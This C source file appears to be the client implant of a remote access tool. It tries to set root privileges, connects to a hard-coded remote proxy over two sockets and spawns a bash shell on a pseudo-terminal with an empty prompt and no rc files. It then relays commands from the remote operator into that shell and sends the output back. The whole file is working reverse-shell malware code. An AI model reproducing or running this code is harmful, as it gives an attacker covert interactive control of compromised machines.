/***************************************************************************************/
/*       ,--,                                                                          */
/*    ,---.'|                                                                          */
/*    |   | :                        ,-.----.                  ___                     */
/*    :   : |                        \    /  \               ,--.'|_                   */
/*    |   ' :                        ;   :    \              |  | :,'        ,----,    */
/*    ;   ; '              .--.--.   |   | .\ :              :  : ' :      .'   .`|    */
/*    '   | |__   ,---.   /  /    '  .   : |: |   ,--.--.  .;__,'  /    .'   .'  .'    */
/*    |   | :.'| /     \ |  :  /`./  |   |  \ :  /       \ |  |   |   ,---, '   ./     */
/*    '   :    ;/    /  ||  :  ;_    |   : .  / .--.  .-. |:__,'| :   ;   | .'  /      */
/*    |   |  ./.    ' / | \  \    `. ;   | |  \  \__\/: . .  '  : |__ `---' /  ;--,    */
/*    ;   : ;  '   ;   /|  `----.   \|   | ;\  \ ," .--.; |  |  | '.'|  /  /  / .`|    */
/*    |   ,/   '   |  / | /  /`--'  /:   ' | \.'/  /  ,.  |  ;  :    ;./__;     .'     */
/*    '---'    |   :    |'--'.     / :   : :-' ;  :   .'   \ |  ,   / ;   |  .'        */
/*              \   \  /   `--'---'  |   |.'   |  ,     .-./  ---`-'  `---'            */
/*               `----'              `---'      `--`---'                               */
/***************************************************************************************/

#include "slave.h"

static bool	cls = false;
static bool	clf = false;

static inline
void	eperror(const char* msg)
{
	perror(msg);
	exit(1);
}

void	connect_to_proxy(s_slave* ratz)
{
	ratz->net.addri.sin_port = htons(PORT);
	ratz->net.addri.sin_family = AF_INET;
	if (inet_pton(AF_INET, ADDRESS, &ratz->net.addri.sin_addr) == -1)
		eperror("inet_pton");
	else
	{
		if ((ratz->net.in = socket(AF_INET, SOCK_STREAM, 0)) == -1)
			eperror("socket");
		else if ((ratz->net.out = socket(AF_INET, SOCK_STREAM, 0)) == -1)
			eperror("socket");
		else
			if (connect(ratz->net.in, (const s_sockaddr*)&ratz->net.addri, sizeof(ratz->net.addri)) == -1)
				eperror("connect");
	}
	fcntl(ratz->net.in, F_SETFL, ~O_NONBLOCK);
	fcntl(ratz->net.out, F_SETFL, ~O_NONBLOCK);
	if (send(ratz->net.in, "vi", 2, 0) <= 0)
		eperror("send");
	if (connect(ratz->net.out, (const s_sockaddr*)&ratz->net.addri, sizeof(ratz->net.addri)) == -1)
		eperror("connect");
	if (send(ratz->net.out, "vo", 2, 0) <= 0)
		eperror("send");
}

void	create_ptm(s_slave* slave)
{
	if ((slave->ptm = posix_openpt(O_RDWR | O_NOCTTY)) == -1)
		eperror("posix_openpt");
	else if (grantpt(slave->ptm) == -1)
		eperror("grantpt");
	else if (unlockpt(slave->ptm) == -1)
		eperror("unlockpt");
}

void	try_set_root(s_auth* auth)
{
	if (setuid(0) == -1)
		auth->pr = 0;
	if (setgid(0) == -1)
		auth->gr = 0;
}

void	open_pts(s_slave* slave)
{
	char*	slave_name = ptsname(slave->ptm);
	if (!slave_name)
		eperror("ptsname");
	else if ((slave->pts = open(slave_name, O_RDWR | O_NOCTTY)) == -1)
		eperror("open pts");
}

void	sigh(int sig)
{
	if (sig == SIGUSR1)
		clf = true;
	else if (sig == SIGUSR2)
		cls = true;
	else if (sig == SIGINT)
		printf("sigint\n");
}

void	setup_slave(s_slave* slave)
{
	if (setsid() == -1) // Détache le programme de l'ancienne session, auquel il devient maintenant le leader
		slave->auth.setsid = false;
	open_pts(slave); // Ouvre le terminal esclave
	if (ioctl(slave->pts, TIOCSCTTY, 0) == -1) // Creation d'une nouvelle session
		eperror("ioctl1");//slave->auth.ioctl = false;
}

void	fork_job(s_slave* slave)
{
	setup_slave(slave);
	fcntl(slave->pts, F_SETFL, fcntl(slave->pts, F_GETFL) | O_RDWR);
	dup2(slave->pts, STDIN_FILENO);
	dup2(slave->pts, STDOUT_FILENO);
	dup2(slave->pts, STDERR_FILENO);
	close(slave->pts);
	close(slave->ptm);
	close(slave->net.in);
	close(slave->net.out);
	setenv("PS1", "", 1);
	setenv("TERM", "dumb", 1);
	if (execlp("bash", "bash", "--posix", "--norc", "--noprofile", NULL) == -1)
		eperror("execlp");
}

static inline
void	slave_job(s_slave* slave)
{
	char*	msg_dup;
	int		t = 0;
	int		n = 0;
	int		on = true;

	//if (ioctl(slave->ptm, TIOCPKT, &on) == -1)
	//	eperror("ioctl2");//slave->auth.ioctl = false;
	fcntl(slave->ptm, F_SETFL, fcntl(slave->ptm, F_GETFL) & ~O_NONBLOCK);
	fcntl(slave->net.in, F_SETFL, fcntl(slave->net.in, F_GETFL) & ~O_NONBLOCK);
	fcntl(slave->net.out, F_SETFL, O_NONBLOCK);
	while (waitpid(slave->chd, NULL, WNOHANG) == 0)
	{
		memset(slave->msg, 0, DEBUG_SIZE_MAX);
		fcntl(slave->net.out, F_SETFL, fcntl(slave->net.out, F_GETFL) & ~O_NONBLOCK);
		while ((slave->len = recv(slave->net.out, slave->msg, DEBUG_SIZE_MAX, 0)) == 0)	// rendre bloquant ? (bruit CPU)
			;
		fcntl(slave->net.out, F_SETFL, O_NONBLOCK);
		//printf("cmd : %s\n", slave->msg);
		if (!strcmp(slave->msg, "exit\n"))
			continue ;
		else
		{
			msg_dup = strdup(slave->msg);
			slave->len = sprintf(slave->msg, "kill -12 %d ; %s ; kill -10 %d\n", slave->pid, msg_dup, slave->pid);
			n = slave->len;
			//printf("sprintf : %s\n", slave->msg);
			write(slave->ptm, slave->msg, slave->len);
			while (cls == false)
				;
			while (true)
			{
				if (t < n + 1)
					t += read(slave->ptm, &slave->msg[t], (n + 1) - t);
				else
				{
					fcntl(slave->ptm, F_SETFL, O_NONBLOCK);
					slave->len = read(slave->ptm, slave->msg, DEBUG_SIZE_MAX);
					slave->msg[slave->len] = 0;
					//printf("msg ptm %s\n", slave->msg);
					if (slave->len > 0)
						send(slave->net.in, slave->msg, slave->len, 0);
				}
				slave->len = recv(slave->net.out, slave->msg, slave->len, 0);
				slave->msg[slave->len] = 0;
				if (slave->len > 0)
				{
					if (write(slave->ptm, slave->msg, slave->len) <= 0) // ici ne rentre pas dans le STDIN du pts
						exit(1);
					//printf("stdin : %s\n", slave->msg);
				}
				if (clf == true)
					break;
			}
			t = 0;
			cls = false;
			clf = false;
			send(slave->net.in, "\0033EONING\003", 10, 0);
		}
	}
}

int	main(void)
{
	s_slave	slave;

	try_set_root(&slave.auth);
	connect_to_proxy(&slave);
	//send auth errors
	create_ptm(&slave);
	slave.pid = getpid();
	slave.chd = fork();
	if (slave.chd == -1)
		eperror("fork");
	else if (slave.chd == 0)
		fork_job(&slave);
	else
	{
		struct sigaction	sa;
		memset(&sa, 0, sizeof(sa));
		sa.sa_handler = sigh;
		sigemptyset(&sa.sa_mask);
		sigaction(SIGUSR1, &sa, NULL);
		sigaction(SIGUSR2, &sa, NULL);
		slave_job(&slave);
	}
	return (0);
}
